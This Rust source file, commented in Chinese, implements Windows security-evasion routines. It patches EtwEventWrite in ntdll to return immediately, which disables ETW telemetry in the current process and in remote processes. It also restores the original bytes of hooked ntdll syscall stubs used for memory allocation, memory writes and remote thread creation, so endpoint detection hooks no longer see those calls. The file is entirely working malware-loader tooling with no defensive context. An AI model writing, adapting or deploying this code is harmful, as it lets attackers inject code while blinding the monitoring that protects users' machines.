use log::{debug, error};
use std::fs;
use windows_sys::Win32::Foundation::HANDLE;
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Memory::{
    PAGE_EXECUTE_READWRITE, VirtualProtect, VirtualProtectEx,
};
use windows_sys::Win32::System::SystemInformation::GetSystemDirectoryA;

pub unsafe fn patch_etw_self() {
    unsafe {
        // 取得 ntdll 的 EtwEventWrite 位址
        let ntdll = GetModuleHandleA(c"ntdll.dll".as_ptr().cast());
        if ntdll.is_null() {
            error!("Failed to get ntdll handle");
            return;
        }

        let etw_addr = GetProcAddress(ntdll, c"EtwEventWrite".as_ptr().cast());
        let etw_ptr = match etw_addr {
            Some(f) => f as *mut u8,
            None => {
                error!("Failed to get EtwEventWrite address");
                return;
            }
        };

        // 解除寫入保護
        let mut old_protect: u32 = 0;
        VirtualProtect(
            etw_ptr as *const _,
            1,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        // patch: 寫入 0xC3 (ret)
        *etw_ptr = 0xC3u8;

        // 還原記憶體保護
        VirtualProtect(etw_ptr as *const _, 1, old_protect, &mut old_protect);

        debug!("[ETW] Self ETW patched at 0x{:x}", etw_ptr as usize);
    }
}

pub unsafe fn patch_etw_remote(process_handle: HANDLE) {
    unsafe {
        let ntdll = GetModuleHandleA(c"ntdll.dll".as_ptr().cast());
        if ntdll.is_null() {
            return;
        }

        let etw_addr = GetProcAddress(ntdll, c"EtwEventWrite".as_ptr().cast());
        let etw_ptr = match etw_addr {
            Some(f) => f as *mut u8,
            None => return,
        };

        // ntdll 在所有進程的載入地址相同 (ASLR 對 ntdll 是 per-boot 而不是 per-process)
        let patch_byte: u8 = 0xC3;
        let mut old_protect: u32 = 0;
        let mut bw: usize = 0;

        // 改遠端記憶體保護
        VirtualProtectEx(
            process_handle,
            etw_ptr as *const _,
            1,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        // 寫入 ret
        WriteProcessMemory(
            process_handle,
            etw_ptr as *mut _,
            &patch_byte as *const u8 as *const _,
            1,
            &mut bw,
        );

        // 還原保護
        VirtualProtectEx(
            process_handle,
            etw_ptr as *const _,
            1,
            old_protect,
            &mut old_protect,
        );

        debug!("[ETW] Remote ETW patched at 0x{:x}", etw_ptr as usize);
    }
}

unsafe fn get_ntdll_path() -> String {
    unsafe {
        let mut buf = [0u8; 260];
        let len = GetSystemDirectoryA(buf.as_mut_ptr(), 260);
        let sys_dir = String::from_utf8_lossy(&buf[..len as usize]).to_string();
        format!("{}\\ntdll.dll", sys_dir)
    }
}

pub unsafe fn unhook_ntdll() {
    unsafe {
        debug!("[Unhook] Starting API unhooking...");

        // 從硬碟讀取乾淨的 ntdll
        let ntdll_path = get_ntdll_path();
        let clean_ntdll = match fs::read(&ntdll_path) {
            Ok(b) => b,
            Err(e) => {
                error!("[Unhook] Failed to read ntdll from disk: {}", e);
                return;
            }
        };
        debug!("[Unhook] Read clean ntdll from: {}", ntdll_path);

        // 用 goblin 解析 PE 結構
        let clean_pe = match goblin::pe::PE::parse(&clean_ntdll) {
            Ok(p) => p,
            Err(e) => {
                error!("[Unhook] Failed to parse ntdll PE: {}", e);
                return;
            }
        };

        // 找到 ntdll 的 .text section
        let text_section = match clean_pe.sections.iter().find(|s| {
            let name = String::from_utf8_lossy(&s.name);
            name.starts_with(".text")
        }) {
            Some(s) => s,
            None => {
                error!("[Unhook] .text section not found in clean ntdll");
                return;
            }
        };

        let clean_text_ptr = clean_ntdll
            .as_ptr()
            .add(text_section.pointer_to_raw_data as usize);
        let clean_text_size = text_section.size_of_raw_data as usize;
        let text_rva = text_section.virtual_address as usize;

        // 取得記憶體中載入的 ntdll base
        let ntdll_base = GetModuleHandleA(c"ntdll.dll".as_ptr().cast()) as *mut u8;
        if ntdll_base.is_null() {
            error!("[Unhook] Failed to get ntdll base");
            return;
        }
        debug!("[Unhook] ntdll base in memory: 0x{:x}", ntdll_base as usize);

        // 針對每個目標函式，還原被 hook 的位元組
        for func_name in HOOKED_FUNCTIONS {
            let func_name_cstr = format!("{}\0", func_name);

            // 從記憶體中的 ntdll 取得函式位址
            let func_addr = GetProcAddress(
                ntdll_base as windows_sys::Win32::Foundation::HMODULE,
                func_name_cstr.as_ptr(),
            );

            let func_ptr = match func_addr {
                Some(f) => f as *mut u8,
                None => {
                    error!("[Unhook] Failed to find: {}", func_name);
                    continue;
                }
            };

            // 計算該函式在 .text section 中的偏移
            let func_rva = func_ptr as usize - ntdll_base as usize;

            // 確認在 .text section 範圍內
            if func_rva < text_rva || func_rva >= text_rva + clean_text_size {
                debug!(
                    "[Unhook] Remote {} is outside .text section, skipping",
                    func_name
                );
                continue;
            }

            // 從 .text section 取得對應的位元組（前 8 bytes 即可覆蓋 jmp hook）
            let clean_offset = func_rva - text_rva;
            let clean_bytes = std::slice::from_raw_parts(clean_text_ptr.add(clean_offset), 8);

            // 檢查是否已被 hook（第一個 byte 是 0xE9 = jmp）
            let current_byte = *func_ptr;
            if current_byte != 0xE9 {
                debug!(
                    "[Unhook] {} - not hooked (0x{:02x}), skipping",
                    func_name, current_byte
                );
                continue;
            }

            debug!(
                "[Unhook] {} hooked at 0x{:x}, restoring...",
                func_name, func_ptr as usize
            );

            // 解除記憶體保護
            let mut old_protect: u32 = 0;
            VirtualProtect(
                func_ptr as *const _,
                8,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );

            // 還原位元組
            std::ptr::copy_nonoverlapping(clean_bytes.as_ptr(), func_ptr, 8);

            // 還原記憶體保護
            VirtualProtect(func_ptr as *const _, 8, old_protect, &mut old_protect);

            debug!("[Unhook] {} restored successfully", func_name);
        }

        debug!("[Unhook] API unhooking complete");
    }
}

pub unsafe fn unhook_ntdll_remote(process_handle: windows_sys::Win32::Foundation::HANDLE) {
    unsafe {
        debug!("[Unhook] Starting remote ntdll unhooking...");

        let ntdll_path = get_ntdll_path();
        let clean_ntdll = match fs::read(&ntdll_path) {
            Ok(b) => b,
            Err(e) => {
                error!("[Unhook] Failed to read ntdll: {}", e);
                return;
            }
        };

        let clean_pe = match goblin::pe::PE::parse(&clean_ntdll) {
            Ok(p) => p,
            Err(_) => return,
        };

        let text_section = match clean_pe
            .sections
            .iter()
            .find(|s| String::from_utf8_lossy(&s.name).starts_with(".text"))
        {
            Some(s) => s,
            None => return,
        };

        let clean_text_ptr = clean_ntdll
            .as_ptr()
            .add(text_section.pointer_to_raw_data as usize);
        let text_rva = text_section.virtual_address as usize;

        let ntdll_base = GetModuleHandleA(c"ntdll.dll".as_ptr().cast()) as *mut u8;

        for func_name in HOOKED_FUNCTIONS {
            let func_name_cstr = format!("{}\0", func_name);
            let func_addr = GetProcAddress(
                ntdll_base as windows_sys::Win32::Foundation::HMODULE,
                func_name_cstr.as_ptr(),
            );

            let func_ptr = match func_addr {
                Some(f) => f as *mut u8,
                None => continue,
            };

            let func_rva = func_ptr as usize - ntdll_base as usize;
            let clean_offset = func_rva - text_rva;
            let clean_bytes = std::slice::from_raw_parts(clean_text_ptr.add(clean_offset), 8);

            // 遠端改保護
            let mut old_protect: u32 = 0;
            VirtualProtectEx(
                process_handle,
                func_ptr as *const _,
                8,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );

            // 寫入乾淨位元組到遠端進程
            let mut bw: usize = 0;
            WriteProcessMemory(
                process_handle,
                func_ptr as *mut _,
                clean_bytes.as_ptr() as *const _,
                8,
                &mut bw,
            );

            // 還原保護
            VirtualProtectEx(
                process_handle,
                func_ptr as *const _,
                8,
                old_protect,
                &mut old_protect,
            );

            debug!("[Unhook] Remote {} restored", func_name);
        }
    }
}

const HOOKED_FUNCTIONS: &[&str] = &[
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtReadVirtualMemory",
];
